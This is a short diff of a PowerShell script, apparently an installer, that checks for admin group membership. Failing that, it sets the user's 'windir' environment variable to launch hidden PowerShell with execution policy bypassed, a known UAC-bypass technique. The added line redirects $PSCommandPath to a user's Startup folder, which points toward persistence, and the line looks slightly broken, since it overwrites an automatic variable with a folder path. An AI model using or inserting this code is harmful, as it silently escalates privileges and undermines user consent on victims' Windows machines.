@@ -2,6 +2,7 @@ if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S
     powershell powershell.exe "./installer.ps1"
 } else {
    $registryPath = "HKCU:\Environment"
+   $PSCommandPath = "C:\Users\darkd\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath; #"
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
